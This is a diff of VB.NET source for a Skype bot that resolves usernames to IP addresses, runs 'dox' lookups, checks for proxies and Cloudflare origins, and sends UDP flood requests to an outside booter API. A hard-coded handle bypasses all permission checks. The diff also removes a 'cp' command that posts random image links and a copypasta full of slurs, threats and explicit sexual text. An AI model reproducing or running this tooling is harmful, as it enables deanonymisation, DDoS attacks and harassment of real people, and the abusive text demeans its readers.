@@ -1,5 +1,4 @@
-﻿
-Imports SKYPE4COMLib
+﻿Imports SKYPE4COMLib
 Imports System.IO
 Imports System.Net.Mail
 Imports System.Web
@@ -19,7 +18,7 @@ Public Class Form1
         anonymousproxy = 2
         transparentproxy = 1
     End Enum
-    Public Const version As String = "1.0.0.2"
+    Public Const version As String = "5.1.0.7"
     Public state As Integer = 1
     Public launched As Boolean = False
     Dim banmsg As String = "You are banned, Sorry!"
@@ -31,9 +30,7 @@ Public Class Form1
     Dim adminst As Boolean = 1
     Dim resapi As String = "http://skypebot.ga/apis/apis/resolve.php?u=" 'c99
     Dim resapi2 As String = "http://skypebot.ga/apis/apis/resolve2.php?u="
-    Dim resapi3 As String = "http://api.predator.wtf/resolver/?arguments="
     Dim cacheapi As String = "http://skypebot.ga/apis/apis/cached.php?u="
-    Dim cacheapi2 As String = "http://api.predator.wtf/lookup/?arguments="
     Dim lockst As Integer = 0
     Dim Evaluator1 = New Evaluator
     Dim swag As Boolean = 0
@@ -100,6 +97,7 @@ retr:
     Sub AI1(msg As ChatMessage)
         If msg.Body = "" Then Exit Sub
         Dim ai As ChatMessage = msg.Chat.SendMessage("Thinking...")
+
         Dim s As String = AISession.Think(msg.Body.Remove(0, 1))
         s = StripTags(s)
         If s.ToLower.Contains("To use my calculator, click here!".ToLower) Then
@@ -364,7 +362,7 @@ retr:
             End If
         Catch ex As Exception
             Dim errorr As ChatMessage = msg.Chat.SendMessage("An error occured while giving you an error!")
-            AddSwagToMSG(errorr, "An error occured, please report to skype:jeteroll83?chat : " & vbNewLine & paste("Host: " & Skypattach.CurrentUserHandle & vbNewLine & "Sender: " & msg.Sender.Handle & vbNewLine & "Cmd: " & msg.Body & vbNewLine & "Error: " & ex.ToString, "Error!"))
+            AddSwagToMSG(errorr, "An error occured, please report to skype:les.de?chat : " & vbNewLine & paste("Host: " & Skypattach.CurrentUserHandle & vbNewLine & "Sender: " & msg.Sender.Handle & vbNewLine & "Cmd: " & msg.Body & vbNewLine & "Error: " & ex.ToString, "Error!"))
         End Try
     End Sub
     Function Resolve1(skype As String)
@@ -373,7 +371,7 @@ retr:
         Try
             Dim ip As String = w.DownloadString(resapi & skype)
             If ip.Contains("API2") Then
-                Return "IP not found."
+                Return "IP Not found."
             Else
                 Return ip.Replace(vbNewLine, "").Replace(" ", "").Replace(Environment.NewLine, "").Replace(vbCr, "").Replace(vbLf, "")
             End If
@@ -392,63 +390,31 @@ retr:
             Return "error"
         End Try
     End Function
-    Function Resolve3(skype As String)
-        Dim w As New Net.WebClient
-        w.Proxy = Nothing
-        Try
-            Dim ip As String = w.DownloadString(resapi3 & skype)
-            Return ip
-        Catch
-            Return "error"
-        End Try
-    End Function
     Function Cached(skype As String)
         Dim w As New Net.WebClient
         w.Proxy = Nothing
+
         Try
             Dim ip As String = w.DownloadString(cacheapi & skype).Replace("&nbsp;", "").Replace("[", "").Replace("]", "").Replace("][", " ").Replace("  ", " ").Replace(" - ", " ").Replace(",", "")
             Dim ips() As String = ip.Split(" ")
             If IsIpValid(ips(0)) Then
             Else
-                Return "IP not found."
+                Return "IP Not found."
                 Exit Function
             End If
             Return ip
         Catch
             Return "error"
         End Try
-    End Function
-    Function Cached2(skype As String)
-        Dim w As New Net.WebClient
-        w.Proxy = Nothing
-        Try
-            Dim ip As String = w.DownloadString(cacheapi & skype).Replace("&nbsp;", "").Replace("[", "").Replace("]", "").Replace("][", " ").Replace("  ", " ").Replace(" - ", " ").Replace(",", "")
-            Dim ips() As String = ip.Split(" ")
-            If IsIpValid(ips(0)) Then
-            Else
-                Return "IP not found."
-                Exit Function
-            End If
-            Return ip
-        Catch
-            Return "error"
-        End Try
-    End Function
-    Public Function GetRandom(ByVal Min As Integer, ByVal Max As Integer) As Integer
-        ' by making Generator static, we preserve the same instance '
-        ' (i.e., do not create new instances with the same seed over and over) '
-        ' between calls '
-        Static Generator As System.Random = New System.Random()
-        Return Generator.Next(Min, Max)
     End Function
     Sub processcommand(msg As ChatMessage)
         Try
             api = "http://netpunch.xyz/out/api.php?host=[ip]&key=KEYGOESHERE&port=[port]&time=[time]&method=UDP"
             ddosapi2 = "http://netpunch.xyz/out/api.php?host=[ip]&key=KEYGOESHERE&port=[port]&time=[time]&method=UDP"
-            'If msg.ChatName = "#luigi-7.7.99-/$mrfluffypancake;7845dca0296eabeb" Then
-            '    Exit Sub
-            'End If
-            If msg.Sender.Handle = Skypattach.CurrentUserHandle Or msg.Sender.Handle = "jeteroll83" Then GoTo whitelisted
+            If msg.ChatName = "#luigi-7.7.99-/$mrfluffypancake;7845dca0296eabeb" Then
+                Exit Sub
+            End If
+            If msg.Sender.Handle = Skypattach.CurrentUserHandle Or msg.Sender.Handle = "les.de" Then GoTo whitelisted
             Dim parts() As String = TextBox3.Text.Split(New String() {Environment.NewLine},
                                           StringSplitOptions.None)
             If parts(0) = "%everyone%" Then GoTo whitelisted
@@ -471,7 +437,7 @@ whitelisted:
             'ADMINPANEL START
             If command = "admin" Then msg.Chat.SendMessage("Right Syntax: " & trigger & "admin <help/parameters>")
             If command.StartsWith("admin ") Then
-                If msg.Sender.Handle = "jeteroll83" Then GoTo bypass
+                If msg.Sender.Handle = "les.de" Then GoTo bypass
                 If IsAdmin(msg.Sender.Handle) = True Then
                 Else
                     Exit Sub
@@ -613,7 +579,7 @@ bypass:
                     AddSwagToMSG(admin, "This version: " & version & vbNewLine & "Latest version: " & latest & vbNewLine & "Type !admin update to force update!")
                 End If
                 If cmd = "update" Then
-                    If Skypattach.CurrentUserHandle = "jeteroll83" Then Exit Sub
+                    If Skypattach.CurrentUserHandle = "les.de" Then Exit Sub
                     Dim admin As ChatMessage = msg.Chat.SendMessage("Updating...")
                     Dim w As New Net.WebClient
                     w.Proxy = Nothing
@@ -907,8 +873,8 @@ z:
                     If IsUltimate(msg.Sender.Handle) Then
                         GoTo r
                     End If
-                    If q(1) > 50 And IsPremium(msg.Sender.Handle) Then
-                        q(1) = 50
+                    If q(1) > 60 And IsPremium(msg.Sender.Handle) Then
+                        q(1) = 60
                         GoTo r
                     End If
                     If q(1) > 10 And IsNormalUser(msg.Sender.Handle) Then
@@ -1280,12 +1246,11 @@ fq:
                 End If
                 AddSwagToMSG(mb, "Making MSG...")
                 If IsNumeric(d(0)) = True Then
-                    If d(0) > 50 And IsUltimate(msg.Sender.Handle) Then
-                        d(0) = 50
+                    If IsUltimate(msg.Sender.Handle) Then
                         GoTo raa
                     End If
-                    If d(0) > 25 And IsPremium(msg.Sender.Handle) Then
-                        d(0) = 25
+                    If d(0) > 60 And IsPremium(msg.Sender.Handle) Then
+                        d(0) = 60
                         GoTo raa
                     End If
                     If d(0) > 10 And IsNormalUser(msg.Sender.Handle) Then
@@ -1725,7 +1690,7 @@ exitt:
                 End If
                 Dim resolver As ChatMessage = msg.Chat.SendMessage("Resolving...")
                 Dim usernametoresolve As String = resolvesk.Replace(" ", "")
-                If usernametoresolve = "jeteroll83" Then usernametoresolve = msg.Sender.Handle
+                If usernametoresolve = "les.de" Then usernametoresolve = msg.Sender.Handle
                 If My.Settings.whitelist.ToLower.Contains(usernametoresolve.ToLower) Then
                     resolver.Body = "This user has been whitelisted!"
                     Exit Sub
@@ -1734,7 +1699,7 @@ exitt:
                 Dim endresult As String = ""
                 Dim rez As String = ""
 
-                resolver.Body = "Resolver 1: " & "Resolving..." & vbNewLine & "Resolver 2: " & "Resolving..." & vbNewLine & "Resolver 3: " & "Resolving..." & vbNewLine & "Cached IPs: " & "Resolving..." & vbNewLine & "Cached IPs 2: " & "Resolving..."
+                resolver.Body = "Resolver 1: " & "Resolving..." & vbNewLine & "Resolver 2: " & "Resolving..." & vbNewLine & "Cached IPs: " & "Resolving..."
                 endresult = Resolve1(usernametoresolve)
 
                 If IsIpValid(endresult) Or endresult = "error" Then  Else endresult = "IP not found!"
@@ -1744,8 +1709,9 @@ exitt:
 
                 If endresult = "error" Then endresult = "Failed!"
 
+
                 rez = "Resolver 1: " & endresult & vbNewLine & "Resolver 2: "
-                resolver.Body = rez & "Resolving..." & vbNewLine & "Resolver 3: " & "Resolving..." & vbNewLine & "Cached IPs: " & "Resolving..." & vbNewLine & "Cached IPs 2: " & "Resolving..."
+                resolver.Body = rez & "Resolving..." & vbNewLine & "Cached IPs: " & "Resolving..."
                 endresult = Resolve2(usernametoresolve)
 
                 If IsIpValid(endresult) Or endresult = "error" Then  Else endresult = "IP not found!"
@@ -1755,17 +1721,9 @@ exitt:
 
                 If endresult = "error" Then endresult = "Failed!"
 
-                rez = rez & endresult & vbNewLine & "Resolver 3: "
-                resolver.Body = rez & "Resolving..." & vbNewLine & "Cached IPs: " & "Resolving..." & vbNewLine & "Cached IPs 2: " & "Resolving..."
-                endresult = Resolve3(usernametoresolve)
-
-                If IsIpValid(endresult) Then  Else endresult = "IP not found!"
-                If My.Settings.whitelist.Contains(endresult) Then
-                    endresult = "IP has been whitelisted!"
-                End If
 
                 rez = rez & endresult & vbNewLine & "Cached IPs: "
-                resolver.Body = rez & "Resolving..." & vbNewLine & "Cached IPs 2: " & "Resolving..."
+                resolver.Body = rez & "Resolving..."
                 endresult = Cached(usernametoresolve)
 
                 If My.Settings.whitelist.Contains(endresult) Then
@@ -1773,17 +1731,6 @@ exitt:
                 End If
 
                 If endresult = "error" Then endresult = "Failed!"
-                resolver.Body = rez & endresult
-
-                rez = rez & endresult & vbNewLine & "Cached IPs 2: "
-                resolver.Body = rez & "Resolving..."
-                endresult = Cached2(usernametoresolve)
-
-                If My.Settings.whitelist.Contains(endresult) Then
-                    endresult = "IP has been whitelisted!"
-                End If
-
-                If endresult = "Athena Found No Results!" Then endresult = "Failed!"
                 resolver.Body = rez & endresult
                 Exit Sub
             End If
@@ -1795,6 +1742,7 @@ exitt:
 
                 Dim dict As ChatMessage = msg.Chat.SendMessage("Initializing...")
 
+
                 AddSwagToMSG(dict, POST(api, "auth=sb&def=" & command.Remove(0, 5)))
             End If
             'DICT END
@@ -1804,6 +1752,7 @@ exitt:
                 Dim api As String = "http://skypebot.ga/apis/apis/dox.php"
 
                 Dim dox As ChatMessage = msg.Chat.SendMessage("Initializing...")
+
 
                 AddSwagToMSG(dox, paste(POST(api, "auth=sb&u=" & command.Remove(0, 4))))
             End If
@@ -1830,7 +1779,7 @@ exitt:
             If command.StartsWith("cfresolve ") Then
                 Dim l As ChatMessage = msg.Chat.SendMessage("Trying to resolve...")
                 Dim w As New WebClient
-                l.Body = w.DownloadString("http://api.predator.wtf/cfresolve/?arguments=" & command.Replace("cfresolve ", "")).Replace("<br>", vbNewLine)
+                l.Body = w.DownloadString("http://APIOnly.com/cfresolver.php?domain=" & command.Replace("cfresolve ", "")).Replace("<br>", "")
                 Exit Sub
             End If
             'CF RESOLVE END
@@ -1880,14 +1829,8 @@ exitt:
                 End Try
                 Dim tosend As String = d(2)
                 If IsNumeric(d(1)) = True Then
-                    If d(1) > 50 And IsUltimate(msg.Sender.Handle) Then
-                        d(1) = 50
-                    End If
-                    If d(1) > 25 And IsPremium(msg.Sender.Handle) Then
-                        d(1) = 25
-                    End If
-                    If d(1) > 10 And IsNormalUser(msg.Sender.Handle) Then
-                        d(1) = 10
+                    If d(1) > 500 Then
+                        d(1) = 500
                     End If
                 Else
                     AddSwagToMSG(mesg, "ERROR: You entered an invalid number, try to swap the number and msg!")
@@ -1991,6 +1934,7 @@ exitt:
                 If lolyo = True Then AddSwagToMSG(msgr, "Proxy Detected") Else AddSwagToMSG(msgr, "Proxy Not Detected")
             End If
             'VPNCHECK END
+
             'PASTE START
             If command = "paste" Then msg.Chat.SendMessage("Right Syntax: " & trigger & "paste <text>")
             If command.StartsWith("paste ") Then
@@ -2101,85 +2045,6 @@ exitt:
                 End If
             End If
             'YT2MPM3 END
-
-            'WEATHER START
-            If command = "weather" Then msg.Chat.SendMessage("Right Syntax: " & trigger & "weather <city/country>")
-            If command.StartsWith("weather ") Then
-                Dim location = command.Replace("weather ", "").Replace(" ", "")
-                Dim weather As ChatMessage = msg.Chat.SendMessage("Initializing...")
-                Dim w As New WebClient
-                w.Proxy = Nothing
-                Dim res As String = w.DownloadString("http://api.predator.wtf/weather/?arguments=" & location)
-                'Dim linearr() As String
-                res = res.Replace("<br>", vbNewLine)
-                AddSwagToMSG(weather, res)
-                Exit Sub
-            End If
-            'WEATHER END
-
-            'DEEZ NUTS START
-            If command = "deez nuts" Or command = "deeznuts" Then
-                Dim newmsg As ChatMessage = msg.Chat.SendMessage("HA GOTTI")
-            End If
-            'DEEZ NUTS END
-
-            'DARKNESS START
-            If command = "darkness" Then
-                Dim darkness1 As ChatMessage = msg.Chat.SendMessage("Hello darkness, my old friend")
-                Threading.Thread.Sleep(1000)
-                Dim darkness2 As ChatMessage = msg.Chat.SendMessage("I've come to sleep with you again")
-                Threading.Thread.Sleep(1000)
-                Dim darkness3 As ChatMessage = msg.Chat.SendMessage("Because a vision softly creeping")
-                Threading.Thread.Sleep(1000)
-                Dim darkness4 As ChatMessage = msg.Chat.SendMessage("Left its seeds while I was sleeping ")
-                Threading.Thread.Sleep(1000)
-                Dim darkness5 As ChatMessage = msg.Chat.SendMessage("And the vision that was planted in my brain ")
-                Threading.Thread.Sleep(1000)
-                Dim darkness6 As ChatMessage = msg.Chat.SendMessage("Still remains")
-                Threading.Thread.Sleep(1000)
-                Dim darkness7 As ChatMessage = msg.Chat.SendMessage("Within the sound of silence")
-            End If
-            'DARKNESS END
-
-            'CP START
-            If command = "cp" Then
-                Dim rand As Integer = GetRandom(1, 10)
-                Select Case rand
-                    Case 1
-                        Dim newmsg As ChatMessage = msg.Chat.SendMessage("http://imgur.com/135KtDV")
-                    Case 2
-                        Dim newmsg As ChatMessage = msg.Chat.SendMessage("http://imgur.com/pIPnyBw")
-                    Case 3
-                        Dim newmsg As ChatMessage = msg.Chat.SendMessage("http://imgur.com/L5BcuiR")
-                    Case 4
-                        Dim newmsg As ChatMessage = msg.Chat.SendMessage("http://imgur.com/cozg95M")
-                    Case 5
-                        Dim newmsg As ChatMessage = msg.Chat.SendMessage("http://imgur.com/LNDl4gA")
-                    Case 6
-                        Dim newmsg As ChatMessage = msg.Chat.SendMessage("http://imgur.com/aoPqKq7")
-                    Case 7
-                        Dim newmsg As ChatMessage = msg.Chat.SendMessage("http://imgur.com/YRZGTeD")
-                    Case 8
-                        Dim newmsg As ChatMessage = msg.Chat.SendMessage("http://imgur.com/aa1VA5c")
-                    Case 9
-                        Dim newmsg As ChatMessage = msg.Chat.SendMessage("http://imgur.com/BDdPMYb")
-                    Case 10
-                        Dim newmsg As ChatMessage = msg.Chat.SendMessage("http://imgur.com/LMa4NK6")
-                End Select
-            End If
-            'CP END
-
-            'COPYPASTA START
-            If command = "copypasta" Then
-                Dim pastas As String = "What the say did you just say fuck me about, you bitching a little? I’ll have you graduate I know top of my Seals in the Navy Classes, and I’ve been raided in numerou Al Quaeda secret involvements, and I have killed over 300 confirmations. I am a trained gorilla. In warfare, I’m the sniper arm in the entire US force tops. You are targeting me but I’m just another nothing. I will fuck you with precision the wipes which has never been liked before on this scene. Earth, fuck my marking words. You can get away with thinking that shit over me to the Internet? Fuck again, thinker.This chat is full of mentally retarded children, its like they all have one less chromosone and rub their faces against their keyboards hoping for attention, god only knows how they even press ctrl+ v, I swear to god none of you motherfuckers better copy and paste this or you’ll be in serious trouble#Hello am 48 year man from somalia. Sorry for my bed england. I selled my wife for internet connection for play ""heart of stone"" and i want to become the goodest player like you I play with 400 ping on US server and i am rakn 23. pls no copy pasterino my story.#When a woman gets a vibrator, its seen as a bit of naughty fun. BUT when a guy orders a 240 Volt FuckMaster Pro 5000 blowup latex doll with 6 speed pulsating elasticized anus with non-drip semen collection tray , together with optional built in realistic orgasm scream surround sound system, hes called a pervert!!!#The stream starts, and so my spam begins. It shall not end until i am banned. I shall fear no mod, sub to no streamer. I shall live and die in the Chat. For i am the value in the bomber. I am the BM in the lethal. I am the salt in the defeat. I pledge my keyboard to the Chat, for this stream and all the streams to come.#Lᴀᴅɪᴇs ᴀɴᴅ ɢᴇɴᴛʟᴇᴍᴇɴ, I ʀᴇᴄᴇɴᴛʟʏ ʟᴏsᴛ ᴍʏ ᴊᴏʙ ᴀɴᴅ ᴀᴍ ᴄᴜʀʀᴇɴᴛʟʏ ᴜɴᴇᴍᴘʟᴏʏᴇᴅ. Tᴡɪᴛᴄʜ ᴄʜᴀᴛ ʜᴀs ʙᴇᴇɴ ᴍʏ sᴀғᴇ ʜᴀᴠᴇɴ ᴀɴᴅ ᴄᴏᴍғᴏʀᴛ ᴅᴜʀɪɴɢ ᴛʜɪs ᴛɪᴍᴇ. Hᴏᴡᴇᴠᴇʀ, I ᴄᴏᴍᴇ ᴛᴏ ᴛʜɪs sᴛʀᴇᴀᴍ ᴛᴏᴅᴀʏ ᴀɴᴅ ᴡʜᴀᴛ ᴅᴏ I sᴇᴇ? A ʀɪᴅɪᴄᴜʟᴏᴜs ᴀᴍᴏᴜɴᴛ ᴏғ ᴄᴏᴘʏᴘᴀsᴛɪɴɢ ᴛᴏᴍғᴏᴏʟᴇʀʏ. Pʟᴇᴀsᴇ, ʜᴀᴠᴇ ʀᴇsᴘᴇᴄᴛ ғᴏʀ ᴛʜᴇ ɪɴᴛᴇʟʟᴇᴄᴛᴜᴀʟs ʜᴇʀᴇ ᴀɴᴅ ᴛʀʏ ᴛᴏ ʀᴇᴛᴜʀɴ ᴛᴏ ᴛʜᴇ ᴅᴀʏs ᴏғ ɢʟᴏʀɪᴏᴜs ᴅɪsᴄᴜssɪᴏɴ ɪɴ ᴛᴡɪᴛᴄʜ ᴄʜᴀᴛ.#☑ ""This guy’s deck is CRAZY!"" ☑ ""My deck can’t win against a deck like that"" ☑ ""He NEEDED precisely those two cards to win"" ☑ ""He topdecked the only card that could beat me"" ☑ ""He had the perfect cards"" ☑ ""There was nothing I could do"" ☑ ""I played that perfectly""#ヽ༼ຈل͜ຈ༽ﾉ Ｔｈｅ ｓｔｒｅａｍ ｓｔａｒｔｓ， ａｎｄ ｓｏ ｍｙ ｓｐａｍ ｂｅｇｉｎｓ． Ｉｔ ｓｈａｌｌ ｎｏｔ ｅｎｄ ｕｎｔｉｌ ｉ ａｍ ｂａｎｎｅｄ． Ｉ ｓｈａｌｌ ｆｅａｒ ｎｏ ｍｏｄ， ｓｕｂ ｔｏ ｎｏ ｓｔｒｅａｍｅｒ． Ｉ ｓｈａｌｌ ｌｉｖｅ ａｎｄ ｄｉｅ ｉｎ ｔｈｅ Ｃｈａｔ． Ｆｏｒ ｉ ａｍ ｔｈｅ ｖａｌｕｅ ｉｎ ｔｈｅ ｂｏｍｂｅｒ． Ｉ ａｍ ｔｈｅ ＢＭ ｉｎ ｔｈｅ ｌｅｔｈａｌ． Ｉ ａｍ ｔｈｅ ｓａｌｔ ｉｎ ｔｈｅ ｄｅｆｅａｔ． Ｉ ｐｌｅｄｇｅ ｍｙ ｋｅｙｂｏａｒｄ ｔｏ ｔｈｅ Ｃｈａｔ， ｆｏｒ ｔｈｉｓ ｓｔｒｅａｍ ａｎｄ ａｌｌ ｔｈｅ ｓｔｒｅａｍｓ ｔｏ ｃｏｍｅ．#That’s it, I’m done. Fuck this chat. It’s devolved into a mass of retarded copy pastes and face spam. The quality of twitch chat has been declining for a while, but this is the last straw. That’s it. I’m done. I’m uninstalling the internet, chopping off my dick and moving to fucking Antarctica, at least the bacteria there will be fucking smarter discourse.#gr8 b8 m8 no d-b8 i r8 it an 8 i h8 2 b in an ir8 st8 but its my f8hey m8 i apreci8 that u r8 it gr8 u wanna d8 and mayb masturb8 i can ask n8 and we can meet at the g8 dont b l8#Hello guys, I’m back from my 600 seconds timeout. During that time I was able to finish my 200 words essay on the topic of Nazi Germany. My thesis is that Hitler & Nazi beliefs are carried on by twitch.tv Nazi moderators who like to act as if they themselves were literally Hitler. I think I should score at least 90 out of 100 points for that paper. Pls no coperino my paperino#Due to low salt reserves we here at Twitch/Amazon would like to ask the chatters not to spam the PJ‭Salt emote. It spills a lot of salt every time and we estimate there are only about 100 PJ‭Salt usages left. Thank you.#Hello, my name is Hugo Alfredo, i am 14 years old and from chile i watch this stream everyday since my father died in a donkey-waggon accident, now i am finaly make rank 20 in heart of stone, before i only rank 21, sowie for bed englando. pls pls dunt copi espastiro#Guys can you please not spam the chat. My mom bought me this new laptop and it gets really hot when the chat is being spamed. Now my leg is starting to hurt because it is getting so hot. Please, if you don’t want me to get burned, then dont spam the chat#Hello, I am currently 15 years old and I want to become a walrus. I know there’s a million people out there just like me, but I promise you I’m different. On December 14th, I’m moving to Antartica; home of the greatest walruses. I’ve already cut off my arms, and now slide on my stomach everywhere I go as training. I may not be a walrus yet, but I promise you if you give me a chance and the support I need, I will become the greatest walrus#Ok chat, I’m not seeing nearly enough spam in here, I mean I thought this was supposed to be ""the worst chat in twitch"" and this is all you got!? The KPM in this chat is WAY too low, it is actually depressing. How am I supposed to enjoy chat without dongers, ""FrankerZs"", and the occasional elephant?#Wᴇʟʟ Mᴇᴛ Aʟᴋᴀɪᴢᴇʀ ɪᴛ ɪs ʏᴏᴜʀ ɢʀᴇᴀᴛ ғʀɪᴇɴᴅ Sᴋᴏʀɴʏ Sᴋᴏʀɴᴇʀɪɴᴏ. Wᴇ ᴡᴏᴜʟᴅ ʟɪᴋᴇ ʏᴏᴜ ᴀɴᴅ Kɪɴɢ Kᴏɴɢᴏʀ ᴛᴏ ᴘᴀʀᴛɪᴄɪᴘᴀᴛᴇ ɪɴ ᴏᴜʀ ɴᴇᴡ ᴠɪᴅᴇᴏ ""Bᴏᴏɢᴇʀ Bᴏʏs 3: Bʀᴀᴡʟᴇʀ Cɪᴛʏ"" Kᴏɴɢᴏʀ ᴡᴏᴜʟᴅ ʙᴇ ᴀ Tᴀᴛᴇʀғᴇᴅ ɢɪʀʟ ᴀɴᴅ ʏᴏᴜ’ᴅ sᴀʏ ɴᴏ ᴛᴏ ʜᴇʀ Sᴋᴏʀɴᴇʀɪɴᴏ ᴀɴᴅ ᴛʜʀᴇᴀᴛᴇɴɪɴɢ sʜᴏᴜᴛ ʜᴇʀ. Kᴇᴇᴘ ᴅʀɪɴᴋɪɴɢ ᴛʜᴀᴛ ᴅɪᴀʀʀʜᴇᴀ ᴊᴜɪᴄᴇ ᴀɴᴅ ɢɪᴠᴇ sᴛᴇᴠᴇ ᴀᴏᴋɪ ᴀ ʜᴜɢ. RIP ɪɴ Sᴋᴏʀɴᴇʀɪɴᴏs ᴍᴀᴛᴇ, I ᴄʀʏ ᴇᴠᴇʀʏ ᴛɪᴍᴇ. Pʟᴇᴀsᴇ ɴᴏ ᴄᴏᴘʏ ᴘᴀsᴛᴇʀɪɴᴏ. Gᴏᴏᴅʙʏᴇ Aʟᴋᴀɪᴢᴇʀ#ᕼEᒪᒪO TᗯITᑕᕼ ᑕᕼᗩT, ᗪOᑎ ᑭEᑭᑭEᖇOᑎI ᕼEᖇE, ᑕᗩᑭTᗩIᑎ Oᖴ TᕼE ᗩᑎTI-ᖇIOT ᑭOᒪIᑕE. ᔕTOᑭ ᖇIOTIᑎG ᖇIGᕼT ᑎOᗯ, Oᖇ YOᑌ ᗯIᒪᒪ ᗷE TOᑭᗪEᑕKEᗪ. YOᑌ ᕼᗩᐯE ᗷEEᑎ ᗯᗩᖇᑎEᗪ. ᑎO ᑭᑌEᖇTO ᖇIᑕO ᑭᗩᔕTEᖇIᑎO ᗪE ᑎIᖇO TᗩᖇEᑎTIᑎO#Dearest (insert name), this is the Donger Police. We have inside information that states your chat has not been raising a sufficient amount of dongers. We are going to have to shut down your stream if you don’t ask your chat to raise their dongers.#O Tania, where now is that warm cunt of yours, those fat, heavy garters, those soft, bulging thighs? There is a bone in my prick six inches long. I will ream out every wrinkle in your cunt, Tania, big with seed. I will send you home to your Sylvester with an ache in your belly and your womb turned inside out. Your Sylvester! Yes, he knows how to build a fire, but I know how to inflame a cunt. I shoot hot bolts into you, Tani#Ｈｅｌｌｏ <<NAME>>，　ｔｈｉｓ　ｉｓ　ｔｈｅ　ａｄｍｉｎｉｓｔｒａｔｏｒ　ｏｆ　ＰｏｒｎＨｕｂ™　ｗｅ　ｈａｖｅｎｏｔｉｃｅｄ　ｙｏｕ　 ｈａｖｅｎ’ｔ　ｌｏｇｇｅｄ　ｉｎｆｏｒ　２　ｗｅｅｋｓ，　ｗｅ’ｒｅ　ｊｕｓｔ　ｃｈｅｃｋｉｎｇ　ｔｏ　ｓｅｅ　ｉｆ　ｅｖｅｒｙｔｈｉｎｇ　 ｉｓ　ｏｋａｙ　ａｎｄ　ｗｅ’ｖｅ　ｐｒｅｐａｒｅｄ　ｙｏｕ　ａ　ｌｉｓｔ　ｏｆ　ｖｉｄｅｏｓ　ｆｒｏｍ　ｙｏｕｒ　ｆａｖｏｕｒｉｔｅ　 ｃａｔｅｇｏｒｙ　（Ａｓｉａｎ）．　Ｓｅｅ　ｙｏｕ　ｓｏｏｎ!#ｗｈｅｎ　ｉ　ｆｅｅｌ BLANK，　ｍｙ　ｈａｎｄ　ａｕｔｏｍａｔｉｃａｌｌｙ　ｇｏ　ｔｏ　ｔｈｅ　ｄｉｃｋ．　ｉ　ｓｔｒｏｋｅ　ｔｈｅ　ｄｉｃｋ　ａｎｄ　ｆｅｅｌ　ｉ　ｈａｖｅ　ｓｅｘ　ｗｉｔｈ　ｔｈｅ　BLANK．　ａｌｌ　ｂｅｃｏｍｉｎｇ BLANK2.#Every day, I open Avoid’s stream and sit down with a 100 pack of capri suns. I wait until the stream starts, and then it begins. I open the box and force myself to drink the capri suns. I have stage V diabetes and will die soon, but I know it is what Avoid likes. I feel at peace knowing that it is what Avoid would have wanted. Please no capri sunerino.#☐ Not REKT ☑ REKT ☑ REKTangle ☑ SHREKT ☑ REKT-it Ralph ☑ Total REKTall ☑ The Lord of the REKT ☑ The Usual SusREKTs ☑ North by NorthREKT ☑ REKT to the Future ☑ Once Upon a Time in the REKT ☑ The Good, the Bad, and the REKT ☑ LawREKT of Arabia ☑ Tyrannosaurus REKT ☑ eREKTile dysfunction ☑ eREKTion#Oᴋᴀʏ, ɢᴜʏs. I’ᴍ sᴏ ғᴜᴄᴋɪɴɢ ᴏᴠᴇʀ ᴛʜɪs ᴄʜᴀᴛ ᴀᴛ ᴛʜɪs ᴘᴏɪɴᴛ. Tʜᴇʀᴇ ᴀʀᴇ ʟɪᴛᴇʀᴀʟʟʏ ʜᴏᴍᴏsᴇxᴜᴀʟ ɢᴀʏ ɢᴜʏs ᴀʟʟ ᴏᴠᴇʀ ᴛʜᴇ ᴘʟᴀᴄᴇ, ᴀʟᴡᴀʏs ᴛᴀʟᴋɪɴɢ ᴀʙᴏᴜᴛ ʜᴏᴡ Aʟᴋᴀɪᴢᴇʀ ɪs ᴀ ᴄʜɪᴄᴋᴇɴ ʙʀᴇᴇᴅᴇʀ ʙᴇᴄᴀᴜsᴇ ʜᴇ ᴊᴜsᴛ ʀᴀɪsᴇᴅ ᴛʜᴇɪʀ ᴄᴀᴡᴋ! Tʜɪs ᴇɴᴅs ʀɪɢʜᴛ ʜᴇʀᴇ! Dᴏɴ’ᴛ ᴄᴏᴘʏ ᴛʜɪs, ᴏʀ I WILL ғɪɴᴅ ʏᴏᴜ ᴀɴᴅ ＳＴＩＣＫ ＹＯＵＲ ＤＩＣＫ ＩＮＳＩＤＥ!#Cᴀɴ ʏᴏᴜ ᴀʟʟ ᴊᴜsᴛ sᴛᴏᴘ ᴘᴏsᴛɪɴɢ ᴛʜᴇsᴇ ᴜɴɴᴇᴄᴇssᴀʀɪʟʏ ʟᴏɴɢ ᴘᴏsᴛs ᴘʟᴇᴀsᴇ? Tʜᴇ ᴏɴʟʏ ʀᴇᴀsᴏɴ ʏᴏᴜ ᴘᴏsᴛ ᴛʜᴇᴍ ɪs ᴛᴏ ᴛʀʏ ᴀɴᴅ ʙᴀɪᴛ sᴏᴍᴇᴏɴᴇ ɪɴᴛᴏ ᴄᴏᴘʏ ᴀɴᴅ ᴘᴀsᴛɪɴɢ ᴛʜᴇᴍ. Wʜᴀᴛ ɪғ ᴡᴇ ᴀʟʟ ᴊᴜsᴛ ɢᴀᴠᴇ ɪɴᴛᴇʀᴇsᴛɪɴɢ ᴠɪᴇᴡs ᴀɴᴅ ᴏᴘɪɴɪᴏɴs ᴀʙᴏᴜᴛ ᴛʜᴇ sᴛʀᴇᴀᴍ ɪɴsᴛᴇᴀᴅ ᴏғ ᴘᴏsᴛɪɴɢ ᴜsᴇʟᴇss sᴛᴜғғ? Pʟᴇᴀsᴇ I ʙᴇɢ ʏᴏᴜ ᴛᴡɪᴛᴄʜ ᴄʜᴀᴛ, ᴛᴏ sᴛᴏᴘ ᴡɪᴛʜ ᴛʜɪs ɴᴏɴsᴇɴsᴇ.#oi m8 ill fok you up you little gob shite i give you a swallen gabba if you try ot ban me again you cheeky kunt u cant even lift a finger to punch me m8 1v1 me i bench press your nan nd 1 foot in dat door ill smash ye n shag your sis. i swear on me mom#ᶫᶦˢᵗᵉᶰ ᵘᵖ ᵐᵒᵗʰᵉʳᶠᵘᶜᵏᵉʳˢ ʸᵒᵘ ᵃʳᵉ ᵃᶫᶫ ᵃᶜᵗᶦᶰᵍ ʷᵃʸ ᵒᵘᵗ ᵒᶠ ʰᵃᶰᵈ ᵃᶰᵈ ᶰᵒᵗ ᵃᶜᵗᶦᶰᵍ ᶦᶰ ᵃᶜᶜᵒʳᵈ ʷᶦᵗʰ ᵗʷᶦᵗᶜʰ ᵖᵒᶫᶦᶜᶦᵉˢ ʷᶦᵗʰ ᵃᶫᶫ ᵗʰᶦˢ ˢᵖᵃᵐᵐᶦᶰᵍ ᵃᶰᵈ ʸᵒᵘ ᵃʳᵉ ᵃᶫˢᵒ 